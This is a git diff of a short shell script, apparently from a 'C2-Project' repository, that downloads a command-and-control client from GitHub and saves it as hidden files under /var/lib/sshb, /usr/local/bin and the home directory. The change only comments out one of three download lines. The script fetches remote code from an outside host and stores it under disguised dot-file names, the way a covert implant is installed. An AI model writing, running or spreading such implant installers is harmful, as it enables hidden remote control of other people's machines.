@@ -1,7 +1,7 @@
 #Make directory in /usr/local/bin
 mkdir /var/lib/sshb/
 #Curl the client file into it
-curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.py > /var/lib/sshb/.sshb.py
+# curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.py > /var/lib/sshb/.sshb.py
 curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.py > /usr/local/bin/.client.py
 curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client.py > ~/.client.py
 #copy python
